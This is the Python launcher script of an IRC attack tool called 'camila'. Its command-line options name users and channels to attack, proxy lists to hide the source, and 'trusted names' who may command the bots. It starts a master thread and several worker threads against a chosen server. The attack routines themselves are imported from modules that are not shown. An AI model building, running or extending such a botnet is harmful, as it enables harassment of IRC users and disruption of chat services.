#!/bin/python

import argparse
import irc
import threading
import time
import ircmaster
import ircworker

'''
******************************************************************************************
*       ######       #            #         #       #########  #               #         *
*      #            # #          # #       # #          #      #              # #        *
*     #            #   #        #   #     #   #         #      #             #   #       *
*     #           #######      #     #   #     #        #      #            #######      *
*      #         #       #    #       # #       #       #      #           #       #     *
*       ######  #         #  #         #         #  #########  #########  #         #    *
******************************************************************************************
'''

debug = True

def camila(message):
	print '[camila] # {0}'.format(message)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-a', '--attack-names', type=str, nargs='+', help="name list to attack. Overrides retrieving names!")
	parser.add_argument('-c', '--attack-channels', type=str, nargs='+', help="channels to attack")
	parser.add_argument('-i', '--ignore-names', type=str, nargs='+', help="name list to ignore attacking")
	parser.add_argument('-p', '--proxies', type=str, nargs='+', help="proxy list")
	parser.add_argument('-s', '--server', type=str, help="IRC server to connect to as SERVER:PORT")
	parser.add_argument('-t', '--threads', type=int, help="number of threads (defaults to 1)")
	parser.add_argument('-T', '--trusted-names', type=str, nargs='+', help="Names to trust to send commands")
	parser.add_argument('-v', '--vhost', type=str, help="custom vhost")
	parser.add_argument('--ipv6', help="use IPv6 (defaults to false)")
	parser.add_argument('--password', help="nickserv password")
	parser.add_argument('--ssl', help="use SSL (defaults to false)")

	args = parser.parse_args()

	if args.attack_channels == None:
		args.attack_channels = []

	if args.attack_names == None:
		args.attack_names = []

	if args.ignore_names == None:
		args.ignore_names = []

	if args.proxies == None:
		args.proxies = []

	if args.ipv6 == None:
		args.ipv6 = False

	if args.ssl == None:
		args.ssl = False

	if args.threads == None:
		args.threads = 1

	
	args.port = int(args.server.split(':')[-1])
	args.server = args.server.split(':')[0]

	threads = []
	workers = []
	
	master = ircmaster.IRCMaster(args.server, args.port, None, None, args.threads,
				     args.attack_channels, args.attack_names, args.ignore_names,
				     args.trusted_names, args.ipv6, args.ssl, args.vhost, "camila")
	threads.append(master)
	
	for i in range(args.threads):
		w = ircworker.IRCWorker(args.server, args.port, None, None, args.attack_channels,
					args.attack_names, args.ignore_names, args.trusted_names,
					args.ipv6, args.ssl, args.vhost)
		w.setParent(master)

		workers.append(w)
		threads.append(w)
	try:
		master.setWorkers(workers)
		
		for t in threads:
			t.setDaemon(True)
			t.start()

		while threading.active_count() > args.threads:
			time.sleep(1)
		pass
	except KeyboardInterrupt:
		master.quit()

		for t in threads:
			t.kill_received = True
			t.stop()

if __name__ == "__main__":
	main()
